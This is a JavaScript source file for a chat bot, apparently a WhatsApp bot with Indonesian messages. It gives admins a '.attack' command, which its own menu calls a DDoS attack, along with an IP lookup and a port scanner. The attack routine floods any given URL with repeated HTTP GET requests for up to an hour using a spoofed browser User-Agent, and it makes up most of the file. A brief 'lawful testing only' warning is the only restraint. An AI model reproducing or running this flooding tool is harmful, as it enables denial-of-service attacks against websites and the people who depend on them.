const axios = require('axios');
const dns = require('dns');
const net = require('net');

class Menu {
    constructor() {
        this.attacks = new Map();
    }

    async handleCommand(sock, sender, message, isAdmin) {
        const command = message.trim();
        
        if (!isAdmin && command.startsWith('.')) {
            await this.sendNonAdminMessage(sock, sender);
            return;
        }
        
        if (command === '.menu') {
            await this.showMenu(sock, sender);
        } else if (command.startsWith('.attack')) {
            await this.handleAttackCommand(sock, sender, command);
        } else if (command.startsWith('.ip')) {
            await this.handleIpCommand(sock, sender, command);
        } else if (command.startsWith('.port')) {
            await this.handlePortCommand(sock, sender, command);
        }
    }

    async sendNonAdminMessage(sock, sender) {
        const message = "❌ Akses Ditolak: Hanya admin yang dapat menggunakan perintah bot ini.";
        await sock.sendMessage(sender, { text: message });
    }

    async showMenu(sock, sender) {
        const menuText = `🤖 *BOT ADMIN MENU* 🤖

🔹 *.menu* - Menampilkan menu ini
🔹 *.attack <url> <duration>* - Melakukan serangan DDoS
🔹 *.ip <url/domain>* - Mendapatkan IP address dari domain
🔹 *.port <url/domain> <port>* - Memindai port tertentu

📌 Contoh:
.attack https://example.com 60
.ip example.com
.port example.com 80

⚠️ *PERINGATAN*: Gunakan hanya untuk testing yang sah.`;
        
        await sock.sendMessage(sender, { text: menuText });
    }

    async handleAttackCommand(sock, sender, command) {
        const parts = command.split(' ');
        if (parts.length < 3) {
            await sock.sendMessage(sender, { text: '❌ Format salah! Gunakan: .attack <url> <duration dalam detik>' });
            return;
        }

        const url = parts[1];
        const duration = parseInt(parts[2]);
        
        if (!this.isValidUrl(url)) {
            await sock.sendMessage(sender, { text: '❌ URL tidak valid! Pastikan URL dimulai dengan http:// atau https://' });
            return;
        }

        if (isNaN(duration) || duration < 1 || duration > 3600) {
            await sock.sendMessage(sender, { text: '❌ Durasi tidak valid! Gunakan nilai antara 1-3600 detik' });
            return;
        }

        await sock.sendMessage(sender, { text: `🚀 Memulai serangan ke ${url} selama ${duration} detik...\n⏱️ Delay: 100ms | 🧵 Threads: 5` });

        this.startAttack(sock, sender, url, duration);
    }

    async handleIpCommand(sock, sender, command) {
        const parts = command.split(' ');
        if (parts.length < 2) {
            await sock.sendMessage(sender, { text: '❌ Format salah! Gunakan: .ip <url/domain>' });
            return;
        }

        const domain = parts[1].replace(/^https?:\/\//, '').split('/')[0];
        
        await sock.sendMessage(sender, { text: `🔍 Mencari IP address untuk: ${domain}` });

        try {
            dns.resolve4(domain, (err, addresses) => {
                if (err) {
                    dns.resolve6(domain, (err6, addresses6) => {
                        if (err6) {
                            sock.sendMessage(sender, { text: `❌ Gagal mendapatkan IP untuk ${domain}: ${err6.message}` });
                        } else {
                            sock.sendMessage(sender, { text: `🌐 IPv6 Address untuk ${domain}:\n${addresses6.join('\n')}` });
                        }
                    });
                } else {
                    sock.sendMessage(sender, { text: `🌐 IPv4 Address untuk ${domain}:\n${addresses.join('\n')}` });
                }
            });
        } catch (error) {
            await sock.sendMessage(sender, { text: `❌ Error: ${error.message}` });
        }
    }

    async handlePortCommand(sock, sender, command) {
        const parts = command.split(' ');
        if (parts.length < 3) {
            await sock.sendMessage(sender, { text: '❌ Format salah! Gunakan: .port <url/domain> <port>' });
            return;
        }

        const domain = parts[1].replace(/^https?:\/\//, '').split('/')[0];
        const port = parseInt(parts[2]);
        
        if (isNaN(port) || port < 1 || port > 65535) {
            await sock.sendMessage(sender, { text: '❌ Port tidak valid! Gunakan nilai antara 1-65535' });
            return;
        }

        await sock.sendMessage(sender, { text: `🔍 Memindai port ${port} pada: ${domain}` });

        try {
            dns.lookup(domain, (err, address) => {
                if (err) {
                    sock.sendMessage(sender, { text: `❌ Gagal mendapatkan IP untuk ${domain}: ${err.message}` });
                    return;
                }

                const socket = new net.Socket();
                socket.setTimeout(2000);
                
                socket.on('connect', () => {
                    sock.sendMessage(sender, { text: `✅ Port ${port} pada ${domain} (${address}) TERBUKA` });
                    socket.destroy();
                });
                
                socket.on('timeout', () => {
                    sock.sendMessage(sender, { text: `❌ Port ${port} pada ${domain} (${address}) TERTUTUP atau timeout` });
                    socket.destroy();
                });
                
                socket.on('error', (error) => {
                    sock.sendMessage(sender, { text: `❌ Port ${port} pada ${domain} (${address}) TERTUTUP: ${error.code}` });
                    socket.destroy();
                });
                
                socket.connect(port, address);
            });
        } catch (error) {
            await sock.sendMessage(sender, { text: `❌ Error: ${error.message}` });
        }
    }

    isValidUrl(string) {
        try {
            new URL(string);
            return true;
        } catch (_) {
            return false;
        }
    }

    async startAttack(sock, sender, url, duration) {
        const attackId = Date.now().toString();
        const endTime = Date.now() + (duration * 1000);
        let requestCount = 0;
        let errorCount = 0;
        
        this.attacks.set(attackId, {
            interval: setInterval(async () => {
                if (Date.now() > endTime) {
                    this.stopAttack(attackId);
                    await sock.sendMessage(sender, { 
                        text: `✅ Serangan ke ${url} selesai!\n📊 Total requests: ${requestCount}\n❌ Errors: ${errorCount}` 
                    });
                    return;
                }

                for (let i = 0; i < 5; i++) {
                    this.sendRequest(url)
                        .then(() => {
                            requestCount++;
                        })
                        .catch(() => {
                            errorCount++;
                        });
                }
            }, 100)
        });

        setTimeout(() => {
            if (this.attacks.has(attackId)) {
                this.stopAttack(attackId);
            }
        }, duration * 1000);
    }

    stopAttack(attackId) {
        if (this.attacks.has(attackId)) {
            clearInterval(this.attacks.get(attackId).interval);
            this.attacks.delete(attackId);
        }
    }

    async sendRequest(url) {
        try {
            await axios.get(url, {
                timeout: 5000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'max-age=0'
                }
            });
        } catch (error) {
            throw error;
        }
    }
}

module.exports = new Menu();